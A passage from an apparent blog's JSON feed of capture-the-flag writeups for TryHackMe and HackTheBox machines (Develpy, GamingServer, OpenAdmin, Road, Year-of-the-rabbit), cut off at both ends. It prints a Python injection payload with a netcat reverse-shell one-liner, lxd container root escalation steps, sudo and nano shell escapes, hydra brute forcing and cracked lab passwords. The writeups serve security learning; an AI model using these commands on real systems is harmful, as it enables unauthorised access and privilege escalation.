\\\x20exp\\nSF:loits\\\\x20to\\\\x20send\\\\?\\\\?:\\\\x20\'\\\\)\\\\)\\\\r\\\\n\\\\x20\\\\x20File\\\\x20\\\\\\"<string>\\\\\\",\\\\x20l\\nSF:ine\\\\x201,\\\\x20in\\\\x20<module>\\\\r\\\\nNameError:\\\\x20name\\\\x20\'OPTIONS\'\\\\x20is\\\\x2\\nSF:0not\\\\x20defined\\\\r\\\\n\\")%r(GenericLines,13B,\\"\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\x20\\\\\\nSF:x20\\\\x20Private\\\\x200days\\\\r\\\\n\\\\r\\\\n\\\\x20Please\\\\x20enther\\\\x20number\\\\x20of\\\\x20\\nSF:exploits\\\\x20to\\\\x20send\\\\?\\\\?:\\\\x20Traceback\\\\x20\\\\(most\\\\x20recent\\\\x20call\\\\x2\\nSF:0last\\\\):\\\\r\\\\n\\\\x20\\\\x20File\\\\x20\\\\\\"\\\\./exploit\\\\.py\\\\\\",\\\\x20line\\\\x206,\\\\x20in\\\\x20\\nSF:<module>\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\x20num_exploits\\\\x20=\\\\x20int\\\\(input\\\\(\'\\\\x20Pleas\\nSF:e\\\\x20enther\\\\x20number\\\\x20of\\\\x20exploits\\\\x20to\\\\x20send\\\\?\\\\?:\\\\x20\'\\\\)\\\\)\\\\r\\\\n\\nSF:\\\\x20\\\\x20File\\\\x20\\\\\\"<string>\\\\\\",\\\\x20line\\\\x200\\\\r\\\\n\\\\x20\\\\x20\\\\x20\\\\x20\\\\r\\\\n\\\\x20\\\\\\nSF:x20\\\\x20\\\\x20\\\\^\\\\r\\\\nSyntaxError:\\\\x20unexpected\\\\x20EOF\\\\x20while\\\\x20parsing\\\\\\nSF:r\\\\n\\");\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 133.32 seconds\\n```\\n\\n---\\n\\n--\x3e i found nothing after opening port `10000` on browser but i knew that it\'s executing python code so let\'s try to connect with netcat\\n\\n`nc <ip> <port>`\\n\\n--\x3e and i found this :\\n\\n![](Attachments/Pastedimage20210903143044.png)\\n\\n--\x3e that means it\'s pinging tryhackme 2 times so we have to do something called `python command injection`\\n\\n--\x3e so i found this website for this\\n\\nhttps://www.stackhawk.com/blog/command-injection-python/\\n\\n--\x3e and i made this payload\\n\\n```bash\\n__import__(\'os\').system(\\"id\\")\\n```\\n\\n--\x3e and i got the result of id command !\\n\\n![](Attachments/Pastedimage20210903143250.png)\\n\\n--\x3e so now we can get the reverse shell from this !\\n\\n---\\n\\n```bash\\n__import__(\'os\').system(\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.152 4444 >/tmp/f\\")\\n```\\n\\n---\\n\\n## Privesc\\n\\n--\x3e i found 2 files in `/home/king` `root.sh` and `run.sh` so i think there should be some cronjob running in the backend so i checked `/etc/crontab` and found 3 cronjobs\\n\\n![](Attachments/Pastedimage20210904035052.png)\\n\\n--\x3e then i executed `pspy` and found that `root.sh` is running as root every 1 min\\n\\n--\x3e but we don\'t have permissions to write on that file\\n\\n--\x3e so i deleted `root.sh` file because it\'s in our home directory so we can delete it and after i addded reverse shell in that file and gav e `777` permission to execute it !\\n\\n--\x3e now just start listner on netcat\\n\\n--\x3e and after 1 minute i got root !\\n\\n![](Attachments/Pastedimage20210904035326.png)"},{"id":"gamingserver","metadata":{"permalink":"/Cybernotes/blog/gamingserver","source":"@site/blog/2022-02-26-GamingServer/index.md","title":"THM Gamingserver writeup","description":"Hello Everyone.","date":"2022-02-26T00:00:00.000Z","formattedDate":"February 26, 2022","tags":[{"label":"lxd","permalink":"/Cybernotes/blog/tags/lxd"},{"label":"john","permalink":"/Cybernotes/blog/tags/john"},{"label":"boot2root","permalink":"/Cybernotes/blog/tags/boot-2-root"}],"readingTime":3.845,"truncated":true,"authors":[{"name":"Ky10100","title":"Author","url":"https://medium.com/@ky10100","imageURL":"https://pbs.twimg.com/profile_images/1475714792291594241/sbf7xHdX_400x400.jpg","key":"ky"}],"frontMatter":{"slug":"gamingserver","title":"THM Gamingserver writeup","authors":["ky"],"image":"https://tryhackme-images.s3.amazonaws.com/room-icons/80d16a6756c805903806f7ecbdd80f6d.jpeg","tags":["lxd","john","boot2root"]},"prevItem":{"title":"THM Develpy writeup","permalink":"/Cybernotes/blog/develpy"},"nextItem":{"title":"HTB OpenAdmin writeup","permalink":"/Cybernotes/blog/openadmin"}},"content":"Hello Everyone.\\n\\nThis is my first blog so do correct me if I go wrong anywhere. So in this blog we will go through a tryhackme machine [GamingServer](https://tryhackme.com/room/gamingserver)\\nSo lets get started\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/80d16a6756c805903806f7ecbdd80f6d.jpeg)\\n\\n\x3c!--truncate--\x3e\\n\\n# Enumeration\\n\\n---\\n\\n## Nmap\\n\\n-> Our first step will be to find open ports on given ip so that we can gain access to victim machine from any of the open port using tool called [nmap](https://nmap.org)\\n\\n```bash\\n\u2514\u2500$ sudo nmap -sSCV 10.10.210.28\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)\\n|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)\\n|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)\\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\\n|_http-server-header: Apache/2.4.29 (Ubuntu)\\n|_http-title: House of danak\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n```\\n\\n---\\n\\n## Gobuster\\n\\n-> Port 80 is open so our next tasj is to find the directories present on this web server\\n\\n```bash\\n\u2514\u2500$ gobuster dir -u http://10.10.210.28 -w /usr/share/wordlists/dirb/common.txt -t 30\\n2>/dev/null\\n\\n/.htpasswd            (Status: 403) [Size: 277]\\n/.htaccess            (Status: 403) [Size: 277]\\n/.hta                 (Status: 403) [Size: 277]\\n/index.html           (Status: 200) [Size: 2762]\\n/robots.txt           (Status: 200) [Size: 33]\\n/secret               (Status: 301) [Size: 313] [--\x3e http://10.10.210.28/secret/]\\n/server-status        (Status: 403) [Size: 277]\\n/uploads              (Status: 301) [Size: 314] [--\x3e http://10.10.210.28/uploads/]\\n```\\n\\n---\\n\\n-> Lets visit every directory one by one\\n-> So after visiting robot.txt we get that /upload is allowed  \\n-> After that we have secret so in this directory we get another dir which contains a encrypted idrsa\\n\\n![](Attachment/Pastedimage20220101115747.png)\\n\\n-> Lets save this in a file called `id_rsa`\\n-> Then convert it to john format using ssh2john so that tool john can crack the password\\n-> so first conversion to john format\\n`command: \u2514\u2500$ ssh2john.py id_rsa > coverted `\\n-> After converting we can use john to crack the password but for cracking we require wordlists\\n-> So After visiting `/uploads` we got a list which we can use for john\\n`\u2514\u2500$ wget http://10.10.210.28/uploads/dict.lst` to import this list to local machine\\n`Note: After importing the list convert it to .txt as john will not accept .lst file as wordlist`\\n\\n![](Attachment/Pastedimage20220101120705.png)\\n\\n-> So lets use john to crack the passphrase\\n\\n![](Attachment/Pastedimage20220101121231.png)\\n\\n-> We\'ve cracked the passphrase. Now our next task is to find the user from which we will login into the machine using ssh\\n\\n-> After going through source code of homepage we got the user\\n![](Attachment/Pastedimage20220101122744.png)\\n\\n-> So lets login using ssh\\n`command: \u2514\u2500$ ssh -i id_rsa john@10.10.210.28`\\n\\n-> After login lets grab the user flag\\n\\n![](Attachment/Pastedimage20220101123218.png)\\n\\n## PrivEsc\\n\\n-> Treid `sudo -l` but as we have not password of john so it wont worked\\n-> Then we\'ve the find command from which we can find the suid files but there also didnt got anything special and last one is cronjobs `cat /etc/crontab` which will give if any cronjob is not there which is executing a file with root perm repeatedly with a time period of sleep but there also we got nothing\\n\\n-> Then the last option left is to use linpeas\\n-> We\'ve to transfer the linpeas from our local machine to victim using python3 server and then wget in the victim machine\\n-> execute this command from directory where the linpeas is downloaded in your local machine\\n`command: python3 -m http.server 8181 `\\n-> Then wget the file in victim machine\\n`command: wget http://<tun0_ip>:8181/linpeas.sh `\\n\\n-> In the starting of the linpeas result only we are in lxd group\\n-> So let find out what we can do with it on google\\n-> After going through couple of links got the blog of [Hacking Articles](https://www.hackingarticles.in/lxd-privilege-escalation/) and followed the steps mentioned in the blog and we got root!!!\\n\\n```bash\\nstep:\\n\\tOn attacker machine\\n\\t\\t1) git clone\xa0 https://github.com/saghul/lxd-alpine-builder.git\\n\\t\\t2) cd lxd-alpine-builder\\n\\t\\t3) ./build-alpine\\n\\t\\t4) python -m SimpleHTTPServer\\n\\tOn Victim machine\\n\\t\\t1) cd /tmp\\n\\t\\t2) wget http://192.168.1.107:8000/apline-v3.10-x86_64-20191008_1227.tar.gz\\n\\t\\t3) lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage\\n\\t\\t4) lxc image list\\n\\t\\t5) lxc init myimage ignite -c security.privileged=true\\n\\t\\t6) lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true\\n\\t\\t7) lxc start ignite\\n\\t\\t8) lxc exec ignite /bin/sh\\n\\t\\t9) id\\n\\t\\t10) cd /mnt/root/root\\n\\t\\t11) cat root.txt\\n```\\n\\n![](Attachment/Pastedimage20220101133841.png)\\n\\n![](Attachment/Pastedimage20220101132508.png)\\n\\n---\\n\\n## Outro\\n\\nIt was a great machine. The User shell was bit easy one but in privesc part learned a new thing about how we can get root if we are in the **lxd** group\\n\\nThank you for reading my writeup. I will be constantly uploading blogs on different machines of tryhackme, hackthebox and on anything new I will learn. So follow me for my upcoming blogs and also do visit my [twitter](https://twitter.com/ky10100) profile for any upcoming updates. Till then stay safe stay healthy :)"},{"id":"openadmin","metadata":{"permalink":"/Cybernotes/blog/openadmin","source":"@site/blog/2022-02-26-OpenAdmin/openAdmin.md","title":"HTB OpenAdmin writeup","description":"writeup of openadmin box from Hackthebox","date":"2022-02-26T00:00:00.000Z","formattedDate":"February 26, 2022","tags":[{"label":"openadmin","permalink":"/Cybernotes/blog/tags/openadmin"},{"label":"rce","permalink":"/Cybernotes/blog/tags/rce"},{"label":"ssh2john","permalink":"/Cybernotes/blog/tags/ssh-2-john"},{"label":"nano","permalink":"/Cybernotes/blog/tags/nano"}],"readingTime":2.56,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"openadmin","title":"HTB OpenAdmin writeup","description":"writeup of openadmin box from Hackthebox","image":"/img/HTB/openadmin.png","authors":["shivam"],"tags":["openadmin","rce","ssh2john","nano"]},"prevItem":{"title":"THM Gamingserver writeup","permalink":"/Cybernotes/blog/gamingserver"},"nextItem":{"title":"THM Road writeup","permalink":"/Cybernotes/blog/road"}},"content":"![](/img/HTB/openadmin.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## nmap results\\n\\n> PORT STATE SERVICE VERSION\\n> 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\\n> | ssh-hostkey:\\n> | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)\\n> | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)\\n> |\\\\_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)\\n> 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))\\n> |\\\\_http-server-header: Apache/2.4.29 (Ubuntu)\\n> |\\\\_http-title: Apache2 Ubuntu Default Page: It works\\n> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\n---\\n\\n## dirsearch results\\n\\n```c\\n[09:58:05] 301 -  314B  - /artwork  ->  http://10.10.10.171/artwork/\\n[09:58:18] 200 -   11KB - /index.html\\n[09:58:23] 301 -  312B  - /music  ->  http://10.10.10.171/music/\\n[09:58:31] 403 -  277B  - /server-status\\n```\\n\\n---\\n\\n--\x3e got this website at /artwork directory\\n\\n![](Attachments/Pastedimage20210716101117.png)\\n\\n--\x3e i searched for many things but didn\'t get anything !\\n\\n==> so i went to /music directory and i found another website there\\n\\n![](Attachments/Pastedimage20210716101253.png)\\n\\n--\x3e when i clicked on login page i got something like this\\n\\n![](Attachments/Pastedimage20210716101329.png)\\n\\n--\x3e so the openadmin version is `v18.1.1` so Let\'s search exploit for it !\\n\\n--\x3e and i got one on github and exploit-db\\n\\n![](Attachments/Pastedimage20210716101422.png)\\n\\n---\\n\\n## Exploitation\\n\\n--\x3e so i installed the python file which was on github and first run this command\\n\\n```c\\npython3 ona-rce.py check <url>\\n```\\n\\n--\x3e and i got this text\\n\\n![](Attachments/Pastedimage20210716101630.png)\\n\\n--\x3e so remote host is vulnerable so Let\'s exploit it\\n\\n--\x3e and i got shell !\\n\\n![](Attachments/Pastedimage20210716101740.png)\\n\\n--\x3e after many search i got the database config file in /opt/ona/www/local/config\\n\\n--\x3e and i found the password but we don\'t know whose password it is so i tried this password on both and got the ssh shell of jimmy user !\\n\\n![](Attachments/Pastedimage20210716112150.png)\\n\\n---\\n\\n## User Privesc\\n\\n--\x3e i got one file at /var/www/internal which says\\n\\n```c\\nDon\'t forget your \\"ninja\\" password\\n```\\n\\n![](Attachments/Pastedimage20210716121615.png)\\n\\n--\x3e i did `netstat -anp` and found one port which was running internally\\n\\n![](Attachments/Pastedimage20210716124451.png)\\n\\n--\x3e also i found some files at /var/www/internal\\n\\n![](Attachments/Pastedimage20210716125435.png)\\n\\n--\x3e i got the username as jimmy and password hash in `index.php`\\n\\n![](Attachments/Pastedimage20210716125512.png)\\n\\n--\x3e after decoding that hash i got the password\\n\\n![](Attachments/Pastedimage20210716125550.png)\\n\\n--\x3e so i found that the main.php file is executing the command to display the id_rsa key for joanna so we have to display that page anyway so we can get it !\\n\\n![](Attachments/Pastedimage20210716125406.png)\\n\\n--\x3e so i used curl command to get the resquest page of internal server which was running at port 52843\\n\\n--\x3e command which i used :\\n\\n```js\\ncurl -u jimmy:Revealed http://127.0.0.1:52843/main.php\\n```\\n\\n--\x3e and i got the id_rsa key !\\n\\n![](Attachments/Pastedimage20210716125347.png)\\n\\n--\x3e but it\'s encrypted so Let\'s decrypt it first using ssh2john and john\\n\\n![](Attachments/Pastedimage20210716125317.png)\\n\\n--\x3e after that i got passphrase to login and after that i got joanna\'s SSH shell !\\n\\n---\\n\\n## Root Privesc\\n\\n--\x3e after getting logged in first i done `sudo -l` and found this :\\n\\n![](Attachments/Pastedimage20210716131528.png)\\n\\n--\x3e so i searched for it on github and got this command :\\n\\n```c\\nnano\\n^R^X (here ^ means ctrl)\\nreset; sh 1>&0 2>&0\\n```\\n\\n--\x3e and after that i got root shell !\\n\\n--\x3e but it was not stable so i got the reverse shell with pwncat and got stable root shell !\\n\\n![](Attachments/Pastedimage20210716131716.png)\\n\\n---"},{"id":"road","metadata":{"permalink":"/Cybernotes/blog/road","source":"@site/blog/2022-02-26-Road/index.md","title":"THM Road writeup","description":"Writeup of Road machine from Tryhackme","date":"2022-02-26T00:00:00.000Z","formattedDate":"February 26, 2022","tags":[{"label":"mongodb","permalink":"/Cybernotes/blog/tags/mongodb"},{"label":"ld_preload","permalink":"/Cybernotes/blog/tags/ld-preload"},{"label":"/etc/hosts","permalink":"/Cybernotes/blog/tags/etc-hosts"}],"readingTime":2.375,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"road","title":"THM Road writeup","description":"Writeup of Road machine from Tryhackme","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/86d73ce54a3f392bd56336da012a8270.png","authors":["shivam"],"tags":["mongodb","ld_preload","/etc/hosts"]},"prevItem":{"title":"HTB OpenAdmin writeup","permalink":"/Cybernotes/blog/openadmin"},"nextItem":{"title":"THM Year-of-the-rabbit writeup","permalink":"/Cybernotes/blog/year-of-the-rabbit"}},"content":"Hello everyone,\\n\\nToday we are going to solve Road machine from Tryhackme. we will see mongodb enumration and how to do privesc with `env_keep`\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/86d73ce54a3f392bd56336da012a8270.png)\\n\\n\x3c!--truncate--\x3e\\n\\n## Nmap results\\n\\n```bash\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey:\\n|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)\\n|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)\\n|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)\\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\\n|_http-server-header: Apache/2.4.41 (Ubuntu)\\n|_http-title: Sky Couriers\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 24.02 seconds\\n```\\n\\n---\\n\\n--\x3e Port 80\\n\\n![[Pasted image 20211205043041.png]]\\n\\n## Gobuster results\\n\\n```bash\\n===============================================================\\n/.htaccess            (Status: 403) [Size: 276]\\n/.htpasswd            (Status: 403) [Size: 276]\\n/assets               (Status: 301) [Size: 311] [--\x3e http://10.10.2.144/assets/]\\n/phpMyAdmin           (Status: 301) [Size: 315] [--\x3e http://10.10.2.144/phpMyAdmin/]\\n/server-status        (Status: 403) [Size: 276]\\n/v2                   (Status: 301) [Size: 307] [--\x3e http://10.10.2.144/v2/]\\n===============================================================\\n```\\n\\n---\\n\\n--\x3e Got one admin login page on `http://10.10.2.144/v2/admin/login.html`\\n\\n![](Attachments/Pastedimage20211205045222.png)\\n\\n--\x3e So lets register a user and login with that username\\n\\nafter login i got this page\\n\\n![](Attachments/Pastedimage20211205045254.png)\\n\\n---\\n\\n--\x3e I found this in `profile`\\n\\n![](Attachments/Pastedimage20211205051631.png)\\n\\n--\x3e So we have to add this ip in `/etc/hosts` as `sky.thm`\\n\\n--\x3e after that i found one tab called `reset passwords` which was resetting the current user\'s password\\n\\n![](Attachments/Pastedimage20211205051744.png)\\n\\n--\x3e so i intercepted it and changed the user with `admin@sky.thm`\\n\\n![](Attachments/Pastedimage20211205051834.png)\\n\\n--\x3e and now let\'s login as `admin@sky.thm` and we got logged in !\\n\\n![](Attachments/Pastedimage20211205051912.png)\\n\\n--\x3e so now let\'s try to upload the reverse shell\\n\\nso it got uploaded but from where we can execute it?\\n\\n--\x3e I found this comment in source code\\n\\n![](Attachments/Pastedimage20211205090025.png)\\n\\nso i tried to go in `/v2/profileimages` but it says `Directory listing is disabled.` so then i tried like this `/v2/profileimages/shell.php` and i got the reverse shell !\\n\\n---\\n\\n## user Privesc\\n\\n--\x3e I got the database password in `logincheck.php` file\\n\\n![](Attachments/Pastedimage20211205090624.png)\\n\\nBut i got nothing useful in mysql database !\\n\\ncrypted_password\\n\\n--\x3e I found that there is a `mongodb` running in the background from linpeas.\\n\\n![](Attachments/Pastedimage20211205091553.png)\\n\\n--\x3e i have used this command and i got the mongodb shell !\\n\\n```bash\\nmongo 127.0.0.1:27017\\n```\\n\\n--\x3e after some time i got the password for `webdeveloper` in `user` table\\n\\n==> Some mongo commands:\\n\\n```bash\\nshow dbs\\nuse backup\\nshow collections\\ndb.user.find()\\n```\\n\\n![](Attachments/Pastedimage20211205092439.png)\\n\\n```bash\\nwebdeveloper:BahamasChapp123!@#\\n```\\n\\n---\\n\\n## Root privesc\\n\\n--\x3e when i done `sudo -l` then i got this:\\n\\n```bash\\nMatching Defaults entries for webdeveloper on sky:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin, env_keep+=LD_PRELOAD\\n\\nUser webdeveloper may run the following commands on sky:\\n    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility\\n```\\n\\n--\x3e here after some time i found that there is a `env_keep+=LD_PRELOAD` which is one privilege escalation factor and i have written in detail about it <a href=\\"https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/\\" >here</a>\\n\\nand after following the procedures i got the root shell !\\n\\n![](Attachments/Pastedimage20211205100609.png)\\n\\n---\\n\\n## Resources\\n\\n- https://book.hacktricks.xyz/pentesting/27017-27018-mongodb"},{"id":"year-of-the-rabbit","metadata":{"permalink":"/Cybernotes/blog/year-of-the-rabbit","source":"@site/blog/2022-02-26-Yearoftherabbit/index.md","title":"THM Year-of-the-rabbit writeup","description":"Tryhackme Year-of-the-rabbit writeup","date":"2022-02-26T00:00:00.000Z","formattedDate":"February 26, 2022","tags":[{"label":"FTP","permalink":"/Cybernotes/blog/tags/ftp"},{"label":"stegnography","permalink":"/Cybernotes/blog/tags/stegnography"},{"label":"vi","permalink":"/Cybernotes/blog/tags/vi"}],"readingTime":3.375,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"year-of-the-rabbit","title":"THM Year-of-the-rabbit writeup","description":"Tryhackme Year-of-the-rabbit writeup","image":"https://tryhackme-images.s3.amazonaws.com/room-icons/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg","tags":["FTP","stegnography","vi"],"authors":["shivam"]},"prevItem":{"title":"THM Road writeup","permalink":"/Cybernotes/blog/road"},"nextItem":{"title":"welcome","permalink":"/Cybernotes/blog/welcome"}},"content":"Hello everyone,\\n\\nToday we are going to do Year-of-the-rabbit machine from Tryhackme. we will see some stegnography,some rabbit holes and privesc with vi.\\n\\n![](https://tryhackme-images.s3.amazonaws.com/room-icons/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg)\\n\\n\x3c!--truncate--\x3e\\n\\n## nmap results\\n\\n```c\\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 13:35 EDT\\nNmap scan report for 10.10.190.212 (10.10.190.212)\\nHost is up (0.16s latency).\\nNot shown: 997 closed ports\\nPORT   STATE SERVICE VERSION\\n21/tcp open  ftp     vsftpd 3.0.2\\n22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)\\n| ssh-hostkey:\\n|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)\\n|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)\\n|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)\\n|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)\\n80/tcp open  http    Apache httpd 2.4.10 ((Debian))\\n|_http-server-header: Apache/2.4.10 (Debian)\\n|_http-title: Apache2 Debian Default Page: It works\\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 17.70 seconds\\n```\\n\\n---\\n\\n## dirsearch results\\n\\n```c\\n[13:44:08] Starting:\\n[13:44:17] 301 -  315B  - /assets  ->  http://10.10.190.212/assets/\\n[13:44:31] 200 -    8KB - /index.html\\n[13:44:44] 403 -  278B  - /server-status\\n```\\n\\n---\\n\\n--\x3e i got 2 files in `/assets`\\n\\n![](attachments/Pastedimage20210902140443.png)\\n\\n--\x3e first video was rickroll and i found one comment in `style.css` file\\n\\n```py\\n Nice to see someone checking the stylesheets.\\n Take a look at the page: /sup3r_s3cr3t_fl4g.php\\n```\\n\\n--\x3e when i goto this file i got one alert saying\\n\\n`disable javascript`\\n\\nso i disabled javascript and found this :\\n\\n![](attachments/Pastedimage20210902140740.png)\\n\\n--\x3e and this time there was a directory called `sup3r_s3cr3t_fl4g`\\n\\n--\x3e so i ran dirsearch on this and found only `index.html`\\n\\n--\x3e i found this hidden directory after intercepting the response\\n\\n![](attachments/Pastedimage20210902143034.png)\\n\\n--\x3e after going to this directory i found one image and when i done `strings <image>` then i found this :\\n\\n![](attachments/Pastedimage20210902144212.png)\\n\\n---\\n\\n## Stegnography\\n\\n--\x3e and the text after `One of these is the password:` is not the exifdata but it\'s actully the list of passwords !\\n\\nso we have to use them as a wordlist for hydra\\n\\n--\x3e so Let\'s brute force the ftp password for `ftpuser`\\n\\n```bash\\n\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/THM/Yearoftherabbit]\\n\u2514\u2500$ hydra -l ftpuser -P wordlist.txt ftp://10.10.190.212\\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\\n\\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-02 14:41:00\\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task\\n[DATA] attacking ftp://10.10.190.212:21/\\n[21][ftp] host: 10.10.190.212   login: ftpuser   password: 5iez1wGXKfPKQ\\n1 of 1 target successfully completed, 1 valid password found\\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-02 14:41:26\\n```\\n\\n--\x3e and i got password !\\n\\n--\x3e so Let\'s login on ftp !\\n\\n---\\n\\n## FTP\\n\\n--\x3e got this in ftp\\n\\n![](attachments/Pastedimage20210902144533.png)\\n\\n--\x3e This is `brainfuck` lanugage so Let\'s decode it !\\n\\n--\x3e and i got the password for `eli` and it must be a SSH password\\n\\n![](attachments/Pastedimage20210902144640.png)\\n\\n```c\\neli:DSpDiM1wAEwid\\n```\\n\\n---\\n\\n## SSH\\n\\n--\x3e when we will login with ssh then i got this message\\n\\n![](attachments/Pastedimage20210903114342.png)\\n\\n--\x3e then i done `locate s3cr3t` and found one directory\\n\\n![](attachments/Pastedimage20210903114446.png)\\n\\n--\x3e so Let\'s read that file\\n\\n```c\\nYour password is awful, Gwendoline.\\nIt should be at least 60 characters long! Not just MniVCQVhQHUNI\\nHonestly!\\n\\nYours sincerely\\n   -Root\\n```\\n\\n--\x3e so now we have password of gwendoline so Let\'s login\\n\\n--\x3e and we got logged in and got `user.txt`\\n\\n---\\n\\n## Privesc\\n\\nwhen i done `sudo -l` i found this :\\n\\n```c\\nMatching Defaults entries for gwendoline on year-of-the-rabbit:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\n\\nUser gwendoline may run the following commands on year-of-the-rabbit:\\n    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt\\n```\\n\\n--\x3e it means we can run `vi`as every user except root so we have to find something to bypass this because we want root shell\\n\\n--\x3e after some research i found this exploit from exploit-db\\n\\nhttps://www.exploit-db.com/exploits/47502\\n\\n--\x3e so i made this command\\n\\n```c\\nsudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt\\n```\\n\\n--\x3e after that press `shift+;` and then write `!/bin/bash` and you will get root shell !\\n\\n---"},{"id":"/welcome","metadata":{"permalink":"/Cybernotes/blog/welcome","source":"@site/blog/welcome.md","title":"welcome","description":"Welcome to cybernotes blogs","date":"2022-02-25T15:44:17.431Z","formattedDate":"February 25, 2022","tags":[{"label":"welcome","permalink":"/Cybernotes/blog/tags/welcome"}],"readingTime":0.11,"truncated":false,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"authors":["shivam"],"tags":["welcome"]},"prevItem":{"title":"THM Year-of-the-rabbit writeup","permalink":"/Cybernotes/blog/year-of-the-rabbit"},"nextItem":{"title":"Tryhackme Blue Writeup","permalink":"/Cybernotes/blog/blue"}},"content":"## Welcome to cybernotes blogs\\r\\n\\r\\nHey there \ud83d\udc4b\\r\\n\\r\\nHere i will share all the writeups of CTF challenges like Tryhackme,Hackthebox,Vulnhub,Portswigger and Overthewire."},{"id":"blue","metadata":{"permalink":"/Cybernotes/blog/blue","source":"@site/blog/2022-02-23-Blue/index.md","title":"Tryhackme Blue Writeup","description":"Hello everyone,","date":"2022-02-23T00:00:00.000Z","formattedDate":"February 23, 2022","tags":[{"label":"windows","permalink":"/Cybernotes/blog/tags/windows"},{"label":"blue","permalink":"/Cybernotes/blog/tags/blue"},{"label":"john","permalink":"/Cybernotes/blog/tags/john"},{"label":"msfconsole","permalink":"/Cybernotes/blog/tags/msfconsole"}],"readingTime":1.8,"truncated":true,"authors":[{"name":"0xSH1V4M","title":"Author","url":"https://github.com/shivam1317","imageURL":"https://avatars.githubusercontent.com/u/70281451?v=4","key":"shivam"}],"frontMatter":{"slug":"blue","authors":["shivam"],"tags":["windows","blue","john","msfconsole"],"title":"Tryhackme Blue 